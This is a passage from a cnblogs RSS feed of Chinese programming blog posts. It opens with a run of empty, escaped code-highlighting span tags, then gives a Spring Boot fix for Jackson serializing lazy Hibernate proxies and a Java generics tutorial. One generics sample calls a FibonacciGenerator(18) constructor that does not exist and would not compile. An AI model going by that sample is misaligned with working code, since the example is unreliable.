&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Orientation&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;Horizontal&quot;&lt;span class=&quot;code-attribute&quot;&gt;
&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;</description>
<pubDate>Mon, 04 Mar 2019 13:47:00 +0000</pubDate>
<dc:creator>九天飞翼</dc:creator>
<og:description>介绍 我有一种情况，我希望能够将项目添加到列表中，并在列表中移动项目，这似乎是使用a的最简单方法ListBox。我立刻想到了如何以通用的方式做到这一点，然后，也许，可以使用行为来做到这一点。这似乎是一</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/langda/p/10473467.html</dc:identifier>
</item>
<item>
<title>Spring Boot JPA Entity Jackson序列化触发懒加载的解决方案 - 曾俊杰的专栏</title>
<link>http://www.cnblogs.com/ymstars/p/10473425.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/ymstars/p/10473425.html</guid>
<description>&lt;p&gt;Spring Jpa这项技术在Spring 开发中经常用到。&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;今天在做项目用到了Entity的关联懒加载，但是在返回Json的时候，不管关联数据有没有被加载，都会触发数据序列化，而如果关联关系没有被加载，此时是一个&lt;code&gt;HibernateProxy&lt;/code&gt;，并不是真实的数据，而导致了报错。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;例如这个Topic Entity:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;@Entity
@Table(name = &quot;yms_topics&quot;)
@Getter
@Setter
@NoArgsConstructor
@EntityListeners(AuditingEntityListener.class)
@JsonInclude(JsonInclude.Include.NON_EMPTY)
@NamedEntityGraphs({
        @NamedEntityGraph(name = &quot;topic.all&quot;,
                attributeNodes = {
                        @NamedAttributeNode(value = &quot;author&quot;),
                        @NamedAttributeNode(value = &quot;category&quot;)
                })
})
public class Topic implements Serializable {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @ManyToOne(targetEntity = User.class, cascade = CascadeType.ALL, fetch = FetchType.LAZY)
    @JoinColumn(name = &quot;user_id&quot;)
    private User author;

    @ManyToOne(targetEntity = TopicCategory.class, cascade = CascadeType.ALL, fetch = FetchType.LAZY)
    @JoinColumn(name = &quot;category_id&quot;)
    private TopicCategory category;

    @Column(nullable = false, length = 200)
    private String title;

    @Lob
    @Column(nullable = false, length = 50000)
    private String content;

    @CreatedDate
    private Date createdAt;

    @LastModifiedDate
    private Date updatedAt;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;author 和 category 都是多对一的关联，也就是作者和分类，定义的是懒加载&lt;code&gt;LAZY&lt;/code&gt;，现在需要分页取出记录，Repository 如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;@EntityGraph(value = &quot;topic.all&quot;)
Page&amp;lt;Topic&amp;gt; findAll(Pageable pageable);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这是关联读取author和category数据，没有任何问题。但是如果有的关联不需要加载，将EntityGraph去掉，就会报错。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Page&amp;lt;Topic&amp;gt; findAll(Pageable pageable);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;究其原因就是HibernateProxy 没有办法被序列化，网上有很多的方法，例如&lt;code&gt;JsonIgnoreProperties&lt;/code&gt;，这是治标不治本的方法&lt;/p&gt;
&lt;p&gt;现在要达到的目标是当有关联数据的时候序列化，不存在的时候不返回，或者直接返回Null。&lt;/p&gt;
&lt;p&gt;其实要解决这个问题很简单，那就是使用 Jackson 的一个包 &lt;code&gt;jackson-datatype-hibernate5&lt;/code&gt;。&lt;br/&gt;首先gradle添加依赖：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;compile group: 'com.fasterxml.jackson.datatype', name: 'jackson-datatype-hibernate5', version: '2.9.8'&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这个版本要注意&lt;code&gt;jackson-datatype-hibernateX&lt;/code&gt;，根据Hibernate的版本来定&lt;/p&gt;
&lt;p&gt;然后我们要重写 SpringMvc的 &lt;code&gt;MappingJackson2HttpMessageConverter&lt;/code&gt;，将&lt;code&gt;Hibernate5Module&lt;/code&gt;这个Module 注册到&lt;code&gt;ObjectMapper&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;我们新建一个WebMvcConfig类，如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;@Configuration
public class WebMvcConfig {

    @Bean
    public MappingJackson2HttpMessageConverter mappingJackson2HttpMessageConverter() {
        MappingJackson2HttpMessageConverter converter = new MappingJackson2HttpMessageConverter();
        ObjectMapper mapper = converter.getObjectMapper();
        Hibernate5Module hibernate5Module = new Hibernate5Module();
        mapper.registerModule(hibernate5Module);
        mapper.setDateFormat(new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;));
        return converter;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这是一个Config类,很简单&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;就是注入一个Bean，类型为&lt;code&gt;MappingJackson2HttpMessageConverter&lt;/code&gt;，获取到ObjectMapper&lt;/li&gt;
&lt;li&gt;通过&lt;code&gt;mapper.registerModule(hibernate5Module);&lt;/code&gt;注册Module&lt;/li&gt;
&lt;li&gt;还可以定义时间如期的序列化格式。&lt;/li&gt;
&lt;li&gt;注意如果要让未加载的时候完全不输出，那么在Entity的类级别注解要使用Empty，例如：&lt;code&gt;@JsonInclude(JsonInclude.Include.NON_EMPTY)&lt;/code&gt;，不然当数据为null的时候会输出null。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;到这里我们就可以达到预期的目的了。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;这里可能会导致spring.jackson的配置失效，以后再行研究。&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Mon, 04 Mar 2019 13:41:00 +0000</pubDate>
<dc:creator>曾俊杰的专栏</dc:creator>
<og:description>Spring Jpa这项技术在Spring 开发中经常用到。 今天在做项目用到了Entity的关联懒加载，但是在返回Json的时候，不管关联数据有没有被加载，都会触发数据序列化，而如果关联关系没有被加</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/ymstars/p/10473425.html</dc:identifier>
</item>
<item>
<title>Java——泛型 - SakuraOne</title>
<link>http://www.cnblogs.com/myworld7/p/10473312.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/myworld7/p/10473312.html</guid>
<description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;一般的类和方法，使用的都是具体的类型：基本类型或者自定义的类。如果我们要编写出适用于多种类型的通用代码，那么肯定就不能使用具体的类型。前面我们介绍过&lt;a href=&quot;https://www.cnblogs.com/myworld7/p/10404149.html&quot;&gt;多态&lt;/a&gt;，多态算是一种泛化机制，但是也会拘泥于继承体系，使得代码不够通用。我们应该是希望编写更通用的代码，使代码可以应用于“某种不具体的类型”，而不是一个具体的接口或者是类。&lt;/p&gt;
&lt;p&gt;于是Java SE5便引入了“泛型”。泛型实现了&lt;code&gt;参数化类型&lt;/code&gt;的概念，使代码可以应用于多种类型。泛型出现在编程语言中最初的目的就是希望类或者方法具有更广泛的表达能力。我们将通过解耦类或者方法所使用的类型类型之间的约束来实现这个目的。&lt;/p&gt;
&lt;p&gt;Java中的泛型机制引入的比较晚，相较与如C++之类的语言产生的一开始便具备泛型的编程语言来说，是比较局限的。下面将介绍Java中泛型的基本机制、实现原理以及其局限之处。&lt;/p&gt;
&lt;h2 id=&quot;简单的泛型类&quot;&gt;简单的泛型类&lt;/h2&gt;
&lt;p&gt;引入泛型有很多原因，其中最重要的原因便是为了创建&lt;a href=&quot;https://www.cnblogs.com/myworld7/p/10456821.html&quot;&gt;容器类&lt;/a&gt;。一般持有单个对象的类，可以明确指定其持有的对象类型。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;class AppleJuice{}
public class Cup1{
    private AppleJuice aj;
    public Cup1(AppleJuice aj) { this.aj = aj; }
    public AppleJuice get() { return this.aj; }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们可以看出Cup1类的可重用性并不好，它只能持有单一的AppleJuice类型，若是想持有OrangeJuice类型对象则需要重新写一个类。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在Java SE5之前可以让这个类持有Object类型对象，使得这个类存储任何类型的对象&lt;/strong&gt;。因为Object类是所有类的基类，那么就可以使用&lt;a href=&quot;https://www.cnblogs.com/myworld7/p/10404149.html#_label1_0&quot;&gt;向上转型&lt;/a&gt;，使用基类引用去指向这些子类对象。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;class AppleJuice{}
class OrangeJuice{
    public String toString() { return &quot;OrangeJuice&quot;; }
}

public class Cup2 {
    private Object juice;   //使用Object类型引用
    public Cup2(Object juice) { 
        this.juice = juice; 
    }
    public Object get() { return juice; }
    public void set(Object otherJuice) {
        this.juice = otherJuice;
    }
    public static void main(String[] args) {
        Cup2 cup = new Cup2(new AppleJuice());
        cup.set(new OrangeJuice());
        System.out.println((OrangeJuice)cup.get());
    }
}
/*
output:
OrangeJuice
*/&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;以上便是使用一个Cup2对象存储先后存储了两个不同类型的对象。某些情况下，我们确实希望容器能持有多种类型的对象。但是，通常而言，我们只会使用容器来存储一种类型的对象。&lt;strong&gt;泛型的主要目的之一便是：用来指定容器要持有什么类型的对象，而且由编译器来保证类型的正确性&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;与其使用Object类型，更偏向于不指定类型，在要使用时再决定使用什么类型。为达到这个目的，需要使用&lt;code&gt;类型参数&lt;/code&gt;，&lt;strong&gt;用尖括号括住，放在类名后面&lt;/strong&gt;，类型参数名没有要求但一般是大写单字母T或者是其他字母（个人认为可能是模仿C++中的模板）。然后在使用这个类的时候，再用实际的类型替换此类型参数。例如：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class Cup3 &amp;lt;T&amp;gt;{
    private T juice;
    public Cup3 ( T juice) {
        this.juice = juice;
    }
    public void set(T otherJuice) { juice = otherJuice;}
    public T get() { return juice;}
    public static void main(String[] args) {
        Cup3&amp;lt;AppleJuice&amp;gt; cup = new Cup3&amp;lt;AppleJuice&amp;gt;(new AppleJuice());
        AppleJuice appleJuice = cup.get();  //不需要再向下转型
//      cup.set(new OrangeJuice()); Error
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在Cup3对象中可以存入指定在&amp;lt;&amp;gt;中的类型以及其子类型对象（多态和泛型不冲突）。并且我们注意到，我们在取出对象时不用像使用Object时需要强制类型转换。&lt;/p&gt;
&lt;h3 id=&quot;使用泛型自定义堆栈类&quot;&gt;使用泛型自定义堆栈类&lt;/h3&gt;
&lt;p&gt;在上一篇博客中提到，LinkedList类拥有实现Stack的方法，可以使用LinkedList实现一个栈。现在我们不使用LinkedList，自己来实现链式存储的栈。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class LinkedStack&amp;lt;T&amp;gt; {
    //结点
    private static class Node&amp;lt;U&amp;gt;{
        U item;     //结点数据
        Node&amp;lt;U&amp;gt; next;   //指向下一个结点的引用
        Node() { item = null; next = null;}
        Node(U item, Node&amp;lt;U&amp;gt; next){
            this.item = item;
            this.next = next;
        }
        boolean end() {
            return item==null &amp;amp;&amp;amp; next==null;
        }
    }
    
    private Node&amp;lt;T&amp;gt; top = new Node&amp;lt;T&amp;gt;();    //末端哨兵
    //压栈
    public void push(T item) {
        top = new Node&amp;lt;T&amp;gt;(item, top);
    }
    //出栈
    public T pop() {
        T result = top.item;
        if(!top.end()) {    //若top引用不是指向末端哨兵 则top指向next结点
            top = top.next;
        }
        return result;
    }
    
    public static void main(String[] args) {
        LinkedStack&amp;lt;String&amp;gt; lStack = new LinkedStack&amp;lt;&amp;gt;();//可以省略后面的&amp;lt;&amp;gt;中的参数 编译器会依据前面&amp;lt;&amp;gt;中的参数推断
        //压栈 压栈顺序为Happy Day !
        for(String s : &quot;Happy Day !&quot;.split(&quot; &quot;)) {
            lStack.push(s);
        }
        String s;
        //出栈 出栈顺序为 ! Day Happy
        while((s=lStack.pop()) != null) {
            System.out.println(s);
        }
    }
}
/*
!
Day
Happy
*/&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;泛型接口&quot;&gt;泛型接口&lt;/h2&gt;
&lt;p&gt;泛型也可以应用在接口中。例如&lt;code&gt;生成器（generator）&lt;/code&gt;，这是一种专门负责创建对象的类。生成器是&lt;code&gt;工厂方法设计模式&lt;/code&gt;的一种应用。但是，使用生成器创建对象不需要传入任何参数，而工厂方法却需要参数。&lt;/p&gt;
&lt;p&gt;一般而言，一个生成器只定义一个方法，该方法用于生成对象。这里定义next()方法完成此功能。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public interface Generator&amp;lt;T&amp;gt;{ 
    T next();
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;看泛型应用在接口中，与应用在类中并无差别。&lt;/p&gt;
&lt;p&gt;Generator&amp;lt;T&amp;gt;接口可以生成Fibonacci数列的生成器实现：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class FibonacciGenerator implements Generator&amp;lt;Integer&amp;gt;{
    private int count = 0;
    public Integer next() {
        return fib(count++);
    }
    private int fib(int n) {
        if(n &amp;lt; 2) return 1;
        return fib(n-2) + fib(n-1);
    }
    
    public static void main(String[] args) {        
        FibonacciGenerator fGen = new FibonacciGenerator();
        for(int i=0; i&amp;lt;18; i++) {
            System.out.print(fGen.next() + &quot; &quot;);
        }
    }
}
/*
output:
1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 2584 
*/&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们的类型参数是Integer，但是我们使用的数据类型却是int。是因为Java SE5具备了自动装箱和拆箱功能，使得基本类型可以转换为相应的包装器类型。这里就出现了&lt;strong&gt;Java泛型的一个局限性：基本类型无法作为类型参数使用&lt;/strong&gt;。&lt;/p&gt;
&lt;details readability=&quot;4&quot;&gt;点击我查看什么是装箱和拆箱
&lt;p&gt;基本类型和它对应的封装对象之间的相互转换可以自动进行&lt;br/&gt;装箱是指基本类型转换为对应的封装实例，比如int转换为java.lang.Integer&lt;br/&gt;拆箱是指封装实例转换为基本类型，比如Byte转换为byte&lt;br/&gt;&lt;/p&gt;
&lt;/details&gt;&lt;p&gt;我们还可以编写实现了Iterable的Fibonacci生成器。在实际开发中，若是我们拥有类源码则可以直接重写这个类，若是没有源码控制权，我们也可以通过&lt;code&gt;适配器设计模式&lt;/code&gt;来实现所需要的接口。&lt;/p&gt;
&lt;p&gt;下面将是两种方式的实现&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class IterableFibonacci1 implements Generator&amp;lt;Integer&amp;gt;, Iterable&amp;lt;Integer&amp;gt;{
    private int count;
    private int n = 0;
    
    public IterableFibonacci1(int count) {
        this.count = count;
    }
    
    public Integer next() {
        return fib(n++);
    }
    
    private int fib(int n) {
        if(n &amp;lt; 2) return 1;
        return fib(n-2) + fib(n-1);
    }

    public Iterator&amp;lt;Integer&amp;gt; iterator() {
        return new Iterator&amp;lt;Integer&amp;gt;() {
            public boolean hasNext() {
                return count &amp;gt; 0;
            }
            public Integer next() {
                count--;
                return IterableFibonacci1.this.next();
            }
        };
    }
    
    public static void main(String[] args) {
        for(Integer i : new FibonacciGenerator(18)) {
            System.out.print(i +&quot; &quot;);
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用适配器模式（继承原有类，在原有类的基础上增加新的接口，以达到我们想要完成的功能）&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class IterableGenerator2 extends FibonacciGenerator implements Iterable&amp;lt;Integer&amp;gt;{
    private int n;
    public IterableGenerator2(int count) {
        n = count;
    }
    public Iterator&amp;lt;Integer&amp;gt; iterator() {
        return new Iterator&amp;lt;Integer&amp;gt;() {
            public Integer next() {
                n--;
                return IterableGenerator2.this.next();
            }
            public boolean hasNext() {
                return n &amp;gt; 0;
            }
            public void  remove() { //没有实现
                throw new UnsupportedOperationException();
            }
        };
    }
    
    public static void main(String[] args) {
        for(int i : new IterableGenerator2(18)) {
            System.out.print(i + &quot; &quot;);
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;泛型方法&quot;&gt;泛型方法&lt;/h2&gt;
&lt;p&gt;前面我们介绍了泛型应用于整个类上，其实泛型还可以单独的应用于方法上。泛型方法使得该方法可以独立于类而产生变化。以下，是一个基本的指导原则：如果只使用泛型方法就可以取代整个泛型类，那么就只应该使用泛型方法，它显得更加清楚明了。&lt;/p&gt;
&lt;p&gt;要定义泛型方法，只需将泛型参数列表置于返回值之前：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class GenericMethod {
    public &amp;lt;T&amp;gt; void print(T x) {
        System.out.println(x.getClass().getName());
    }
    public static void main(String[] args) {
        GenericMethod gm = new GenericMethod();
        gm.print(12);
        gm.print(&quot;123&quot;);
        gm.print(12.0);
    }
}
/*
output:
java.lang.Integer
java.lang.String
java.lang.Double
*/&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;注意，在使用泛型类时，必须在创建对象的同时指定类型参数，但是使用泛型方法的同时却不必指明类型参数，编译器会帮我们推断出具体的类型，这也叫做&lt;strong&gt;&lt;span&gt;类型参数推断（type argument inference）&lt;/span&gt;&lt;/strong&gt;。如果调用gm传入的参数是基类数据类型，那么自动装箱机制就会被启用。&lt;/p&gt;
&lt;p&gt;类型推断只对赋值操作有效，其他时候并不起作用。如果将泛型方法的调用结果传递给另一个方法，这时编译器并不会执行类型参数推断。&lt;/p&gt;
&lt;h2 id=&quot;java泛型的实现原理擦除&quot;&gt;Java泛型的实现原理——擦除&lt;/h2&gt;
&lt;p&gt;看下面这个程序&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class ErasedTypeEquivalence {
    public static void main(String[] args) {
        Class c1 = new ArrayList&amp;lt;String&amp;gt;().getClass();
        Class c2 = new ArrayList&amp;lt;Integer&amp;gt;().getClass();
        System.out.println(c1 == c2);
    }
}
/*
output:
true
*/&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;若是在没有看见输出之前我们肯定认为ArrayList&amp;lt;String&amp;gt;和ArrayList&amp;lt;Integer&amp;gt;是不同的类型，但是输出显示它们是相同的类型。&lt;/p&gt;
&lt;p&gt;看下面的例子，会对这个“奇怪”的现象进行更进一步说明：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;class A {}
class B {}
class C &amp;lt;T&amp;gt; {}
class D&amp;lt;P, M&amp;gt;{}

public class LostInformation {
    public static void main(String[] args) {
        List&amp;lt;A&amp;gt; list = new ArrayList&amp;lt;A&amp;gt;();
        Map&amp;lt;A, B&amp;gt; map = new HashMap&amp;lt;A, B&amp;gt;();
        C&amp;lt;B&amp;gt; c = new C&amp;lt;B&amp;gt;();
        D&amp;lt;String, Integer&amp;gt; d = new D&amp;lt;String, Integer&amp;gt;();
        
        System.out.println(Arrays.toString(list.getClass().getTypeParameters()));
        System.out.println(Arrays.toString(map.getClass().getTypeParameters()));
        System.out.println(Arrays.toString(c.getClass().getTypeParameters()));
        System.out.println(Arrays.toString(d.getClass().getTypeParameters()));
    }
}
/*
output:
[E]
[K, V]
[T]
[P, M]
*/&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;根据JDK文档的描述&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;TypeVariable&amp;lt;Class&amp;lt;T&amp;gt;&amp;gt;[] getTypeParameters() 
/*Returns an array of TypeVariable objects that represent the type variables declared by the generic declaration represented by this GenericDeclaration object, in declaration order. */&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Class.getTypeParameters()将“返回一个TypeVariable对象数组，表示有泛型声明所声明的类型参数”，这个方法好像可以看出参数类型信息。可是我们从输出中只看见了参数占位符的标识符，没有具体的类型信息。&lt;/p&gt;
&lt;p&gt;事实上，&lt;strong&gt;在Java中的泛型代码内部，我们无法获取任何有关泛型参数类型的信息&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;我们可以知道类型参数标识符和泛型类型边界（后面介绍什么是边界）这类的信息，但是却取法知道用来创建某个特定实例的实际类型参数。&lt;/p&gt;
&lt;p&gt;看了这些奇怪了例子，不禁想知道Java的泛型是怎样实现的。&lt;strong&gt;&lt;span&gt;Java的泛型是使用擦除来实现的，这意味着在使用泛型时，任何具体的类型信息都会被擦除（若是没有定义边界，则会将类型擦除为Object类型），而唯一知道的就是自己在使用一个对象&lt;/span&gt;&lt;/strong&gt;。因此，ArrayList&amp;lt;String&amp;gt;和ArrayList&amp;lt;Integer&amp;gt;在运行时事实上是相同的类型。这两种形式都被擦除成它们的“原生”类型，即ArrayList（或者说是ArrayList&amp;lt;Object&amp;gt;）。&lt;/p&gt;
&lt;h3 id=&quot;定义擦除的边界&quot;&gt;定义擦除的边界&lt;/h3&gt;
&lt;p&gt;下面一个使用模板的C++示例&lt;/p&gt;
&lt;pre class=&quot;cpp&quot;&gt;
&lt;code&gt;#include &amp;lt;iostream&amp;gt;
using namespace std;

template &amp;lt;class T&amp;gt; class Manipulator {
    T obj;
public:
    Manipulator(T x) { obj = x; }
    void manipulate() { obj.f(); }  //调用了未知类型对象的f()方法
};

class HasF {
public:
    void f() { cout &amp;lt;&amp;lt; &quot;HasF::f()&quot; &amp;lt;&amp;lt; endl; }
};

int main() {
    HasF hf;
    Manipulator&amp;lt;HasF&amp;gt; manipulator(hf);
    manipulator.manipulate();
}
/*
output:
HasF::f()
*/&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;以上代码有一个比较奇怪的地方，maniplate()方法中，在obj上调用f()方法，它怎么知道参数类型T拥有f()方法呢？原来，在实例化这个模板的时候，&lt;strong&gt;C++编译器将进行检查，因此在Maniplator&amp;lt;HasF&amp;gt;被实例化的这一刻，它就看到了HasF有一个方法f()&lt;/strong&gt;。若是没有，则会得到一个编译期错误，这样类型安全就得到了保证。这也就说明了，&lt;strong&gt;C++在模板实例化的时候是知道模板的参数类型的&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;若是Java来实现这样的代码，这样的代码是不能编译的！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1099419/201903/1099419-20190304203706833-675702611.png&quot; width=&quot;600&quot; height=&quot;480&quot;/&gt;&lt;/p&gt;
&lt;p&gt;由于有了擦除，Java编译器无法将manipulate()必须能够在obj上调用f()这一需求映射到HasF用于f()这一事实上。&lt;strong&gt;为了可以调用f()，我们必须协助泛型类，给定泛型类的边界，以告知编译器只能接受遵循这个边界的类型。给定边界时重用了&lt;code&gt;extend&lt;/code&gt;关键字&lt;/strong&gt;。添加了边界后代码就可以运行了。&lt;/p&gt;
